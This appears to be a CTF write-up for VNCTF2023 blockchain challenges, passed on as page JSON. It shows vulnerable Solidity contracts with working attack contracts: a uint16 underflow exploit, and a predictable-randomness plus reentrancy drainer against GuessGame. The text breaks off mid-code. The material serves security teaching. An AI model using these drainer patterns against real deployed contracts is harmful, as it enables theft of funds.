{"title":"VNCTF2023","uid":"7b3ace99200e1da5abf0dd22cabd2b45","slug":"VNCTF2023","date":"2023-02-26T17:45:43.913Z","updated":"2023-03-03T03:16:08.503Z","comments":true,"path":"api/articles/VNCTF2023.json","keywords":null,"cover":"https://cdn.jsdelivr.net/gh/bcYng-image/image/img/image-20221216152229811.png","content":"<h1 id=\"0x01-SignIn\"><a href=\"#0x01-SignIn\" class=\"headerlink\" title=\"0x01 SignIn\"></a>0x01 SignIn</h1><h2 id=\"Code\"><a href=\"#Code\" class=\"headerlink\" title=\"Code\"></a>Code</h2><pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token number\">0.4</span><span class=\"token number\">.23</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">Checkin</span> <span class=\"token punctuation\">&#123;</span>\n   <span class=\"token builtin\">string</span> <span class=\"token keyword\">public</span> welcomeMessage <span class=\"token punctuation\">;</span>\n   <span class=\"token builtin\">uint16</span> <span class=\"token keyword\">public</span> year <span class=\"token punctuation\">;</span>\n   <span class=\"token keyword\">constructor</span> <span class=\"token punctuation\">(</span> <span class=\"token builtin\">string</span> _mssg <span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n     welcomeMessage <span class=\"token operator\">=</span>_mssg <span class=\"token punctuation\">;</span> \n     year <span class=\"token operator\">=</span><span class=\"token number\">2022</span><span class=\"token punctuation\">;</span>\n   <span class=\"token punctuation\">&#125;</span>\n\n   <span class=\"token keyword\">function</span> setMsg <span class=\"token punctuation\">(</span> <span class=\"token builtin\">string</span> _welcomeMessage <span class=\"token punctuation\">,</span><span class=\"token builtin\">uint16</span> _newyear <span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">&#123;</span>\n     welcomeMessage <span class=\"token operator\">=</span>_welcomeMessage <span class=\"token punctuation\">;</span> year <span class=\"token operator\">=</span> year <span class=\"token operator\">-</span> _newyear <span class=\"token punctuation\">;</span>\n   <span class=\"token punctuation\">&#125;</span>\n\n   <span class=\"token keyword\">function</span> uintTostr <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> _i <span class=\"token punctuation\">)</span><span class=\"token keyword\">public</span> <span class=\"token keyword\">pure</span> \n   <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span> <span class=\"token builtin\">string</span> <span class=\"token keyword\">memory</span> _uintAsstring <span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n     <span class=\"token builtin\">uint256</span> number <span class=\"token operator\">=</span>_i <span class=\"token punctuation\">;</span>\n     <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> number <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">return</span> <span class=\"token string\">\"0\"</span><span class=\"token punctuation\">;</span>\n     <span class=\"token builtin\">uint256</span> j <span class=\"token operator\">=</span> number <span class=\"token punctuation\">;</span>\n     <span class=\"token builtin\">uint256</span> len <span class=\"token punctuation\">;</span>\n     <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span> j <span class=\"token operator\">!=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        len <span class=\"token operator\">++</span><span class=\"token punctuation\">;</span>\n        j <span class=\"token operator\">/=</span><span class=\"token number\">10</span><span class=\"token punctuation\">;</span>\n     <span class=\"token punctuation\">&#125;</span>\n     <span class=\"token builtin\">bytes</span> <span class=\"token keyword\">memory</span> bstr <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">bytes</span> <span class=\"token punctuation\">(</span> len <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n     <span class=\"token builtin\">uint256</span> k <span class=\"token operator\">=</span> len <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n     <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span> number <span class=\"token operator\">!=</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        bstr<span class=\"token punctuation\">[</span>k<span class=\"token operator\">--</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token builtin\">bytes1</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint8</span><span class=\"token punctuation\">(</span><span class=\"token number\">48</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span> number <span class=\"token operator\">%</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n        number <span class=\"token operator\">/=</span><span class=\"token number\">10</span><span class=\"token punctuation\">;</span>\n     <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token builtin\">string</span> <span class=\"token punctuation\">(</span> bstr <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n   <span class=\"token punctuation\">&#125;</span>\n   \n\n   <span class=\"token keyword\">function</span> strConcat <span class=\"token punctuation\">(</span> <span class=\"token builtin\">string</span> _a <span class=\"token punctuation\">,</span> <span class=\"token builtin\">string</span> _b <span class=\"token punctuation\">)</span> <span class=\"token keyword\">internal</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span> <span class=\"token builtin\">string</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n     <span class=\"token builtin\">bytes</span> <span class=\"token keyword\">memory</span> _ba <span class=\"token operator\">=</span> <span class=\"token builtin\">bytes</span> <span class=\"token punctuation\">(</span>_a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n     <span class=\"token builtin\">bytes</span> <span class=\"token keyword\">memory</span> _bb <span class=\"token operator\">=</span> <span class=\"token builtin\">bytes</span> <span class=\"token punctuation\">(</span>_b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n     <span class=\"token builtin\">string</span> <span class=\"token keyword\">memory</span> ret <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">string</span> <span class=\"token punctuation\">(</span>_ba<span class=\"token punctuation\">.</span>length <span class=\"token operator\">+</span>_bb<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n     <span class=\"token builtin\">bytes</span> <span class=\"token keyword\">memory</span> bret <span class=\"token operator\">=</span> <span class=\"token builtin\">bytes</span> <span class=\"token punctuation\">(</span> ret <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n     <span class=\"token builtin\">uint256</span> k <span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n     <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> i <span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span>_ba<span class=\"token punctuation\">.</span>length <span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n        bret<span class=\"token punctuation\">[</span>k<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>_ba<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> \n     <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span> i <span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span>_bb<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> \n        bret<span class=\"token punctuation\">[</span>k<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>_bb<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n     <span class=\"token keyword\">return</span> <span class=\"token builtin\">string</span> <span class=\"token punctuation\">(</span> ret <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n     <span class=\"token punctuation\">&#125;</span>\n\n\n     <span class=\"token keyword\">function</span> issolved <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span> <span class=\"token builtin\">bool</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">var</span> msg <span class=\"token operator\">=</span> strConcat <span class=\"token punctuation\">(</span> welcomeMessage <span class=\"token punctuation\">,</span> <span class=\"token function\">uintTostr</span><span class=\"token punctuation\">(</span>year<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span><span class=\"token function\">keccak256</span><span class=\"token punctuation\">(</span> abi<span class=\"token punctuation\">.</span>encodePacked <span class=\"token punctuation\">(</span><span class=\"token string\">\"Welcome to VNCTF2023\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">==</span><span class=\"token function\">keccak256</span><span class=\"token punctuation\">(</span>abi<span class=\"token punctuation\">.</span>encodePacked <span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n   <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"Analyse\"><a href=\"#Analyse\" class=\"headerlink\" title=\"Analyse\"></a>Analyse</h2><p>看起来有些唬人，就是实现了字符串的拼接，下溢2023即可</p>\n<h2 id=\"Attack\"><a href=\"#Attack\" class=\"headerlink\" title=\"Attack\"></a>Attack</h2><pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">contract</span> <span class=\"token class-name\">attack</span><span class=\"token punctuation\">&#123;</span>\n   <span class=\"token keyword\">function</span> <span class=\"token function\">pwn</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _target<span class=\"token punctuation\">)</span><span class=\"token keyword\">public</span> <span class=\"token punctuation\">&#123;</span>\n      Checkin  target <span class=\"token operator\">=</span> <span class=\"token function\">Checkin</span><span class=\"token punctuation\">(</span>_target<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n      target<span class=\"token punctuation\">.</span><span class=\"token function\">setMsg</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Welcome to VNCTF\"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">uint16</span><span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n   <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h1 id=\"0x02\"><a href=\"#0x02\" class=\"headerlink\" title=\"0x02\"></a>0x02</h1><h2 id=\"Code-1\"><a href=\"#Code-1\" class=\"headerlink\" title=\"Code\"></a>Code</h2><pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.8.7</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">GuessGame</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token builtin\">address</span> <span class=\"token keyword\">private</span> GamblingHouseOwner<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">address</span> <span class=\"token keyword\">public</span> Player<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">mapping</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token operator\">=></span> <span class=\"token builtin\">uint256</span><span class=\"token punctuation\">)</span> PlayerWins<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">mapping</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token operator\">=></span> <span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span> GetMoney<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">mapping</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token operator\">=></span> <span class=\"token builtin\">uint256</span><span class=\"token punctuation\">)</span> PlayerPool<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">uint256</span> <span class=\"token keyword\">public</span> PlayerGuess<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">&#123;</span>\n        GamblingHouseOwner <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">//5eth</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">despositFunds</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _addr<span class=\"token punctuation\">)</span> <span class=\"token keyword\">private</span> <span class=\"token punctuation\">&#123;</span>\n        PlayerPool<span class=\"token punctuation\">[</span>_addr<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> PlayerPool<span class=\"token punctuation\">[</span>_addr<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> msg<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">guess</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> _guess<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>_guess <span class=\"token operator\">==</span> <span class=\"token number\">0</span> <span class=\"token operator\">||</span> _guess <span class=\"token operator\">==</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>Player <span class=\"token operator\">==</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>value <span class=\"token operator\">==</span> <span class=\"token number\">1</span> ether<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        Player <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">;</span>\n        <span class=\"token function\">despositFunds</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        PlayerGuess <span class=\"token operator\">=</span> _guess<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">RandomCoin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">private</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span>\n            <span class=\"token builtin\">uint256</span><span class=\"token punctuation\">(</span><span class=\"token function\">keccak256</span><span class=\"token punctuation\">(</span>abi<span class=\"token punctuation\">.</span><span class=\"token function\">encodePacked</span><span class=\"token punctuation\">(</span>block<span class=\"token punctuation\">.</span>timestamp <span class=\"token operator\">^</span> <span class=\"token number\">0x1234567</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span>\n            <span class=\"token number\">2</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">revealResult</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>Player <span class=\"token operator\">==</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token builtin\">uint256</span> winningOption <span class=\"token operator\">=</span> <span class=\"token function\">RandomCoin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>PlayerGuess <span class=\"token operator\">==</span> winningOption<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            PlayerWins<span class=\"token punctuation\">[</span>Player<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> PlayerWins<span class=\"token punctuation\">[</span>Player<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\n            PlayerWins<span class=\"token punctuation\">[</span>Player<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n        Player <span class=\"token operator\">=</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">Winer</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span>PlayerWins<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">sendValue</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token keyword\">payable</span> recipient<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">internal</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>balance <span class=\"token operator\">>=</span> amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span> success<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> recipient<span class=\"token punctuation\">.</span>call<span class=\"token punctuation\">&#123;</span>value<span class=\"token punctuation\">:</span> amount<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">withdrawMoney</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _to<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>PlayerWins<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">>=</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender <span class=\"token operator\">==</span> _to<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>PlayerWins<span class=\"token punctuation\">[</span>_to<span class=\"token punctuation\">]</span> <span class=\"token operator\">>=</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token builtin\">uint256</span> amount <span class=\"token operator\">=</span> PlayerPool<span class=\"token punctuation\">[</span>_to<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n            PlayerPool<span class=\"token punctuation\">[</span>_to<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n            <span class=\"token function\">sendValue</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">payable</span><span class=\"token punctuation\">(</span>_to<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">withdrawFirstWin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>GetMoney<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        PlayerPool<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> PlayerPool<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span> ether<span class=\"token punctuation\">;</span>\n        <span class=\"token function\">withdrawMoney</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        GetMoney<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">isSolved</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>balance <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token function\">receive</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"Analyse-1\"><a href=\"#Analyse-1\" class=\"headerlink\" title=\"Analyse\"></a>Analyse</h2><p><code>RandomCoin</code>a函数随机数漏洞+<code>withdrawFirstWin</code>函数重入漏洞</p>\n<h2 id=\"Attack-1\"><a href=\"#Attack-1\" class=\"headerlink\" title=\"Attack\"></a>Attack</h2><pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">contract</span> <span class=\"token class-name\">attack</span><span class=\"token punctuation\">&#123;</span>\n    GuessGame <span class=\"token keyword\">public</span> target<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _target<span class=\"token punctuation\">)</span><span class=\"token keyword\">payable</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>value <span class=\"token operator\">==</span> <span class=\"token number\">3</span> ether<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        target <span class=\"token operator\">=</span> <span class=\"token function\">GuessGame</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">payable</span><span class=\"token punctuation\">(</span>_target<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">RandomCoin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">private</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span>\n            <span class=\"token builtin\">uint256</span><span class=\"token punctuation\">(</span><span class=\"token function\">keccak256</span><span class=\"token punctuation\">(</span>abi<span class=\"token punctuation\">.</span><span class=\"token function\">encodePacked</span><span class=\"token punctuation\">(</span>block<span class=\"token punctuation\">.</span>timestamp <span class=\"token operator\">^</span> <span class=\"token number\">0x1234567</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span>\n            <span class=\"token number\">2</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">pwn</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token keyword\">public</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">;</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>balance<span class=\"token operator\">!=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#123;</span>target<span class=\"token punctuation\">.</span>guess<span class=\"token punctuation\">&#123;</span>value<span class=\"token punctuation\">:</span><span class=\"token number\">1</span> ether<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">(</span><span class=\"token function\">RandomCoin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        target<span class=\"token punctuation\">.</span><span class=\"token function\">revealResult</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span>\n        target<span class=\"token punctuation\">.</span><span class=\"token function\">withdrawFirstWin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token function\">fallback</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token keyword\">external</span> <span class=\"token keyword\">payable</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span>target<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>balance <span class=\"token operator\">!=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n            target<span class=\"token punctuation\">.</span><span class=\"token function\">withdrawFirstWin</span><span class=\"token punctuation\">(</span><span class=\"token 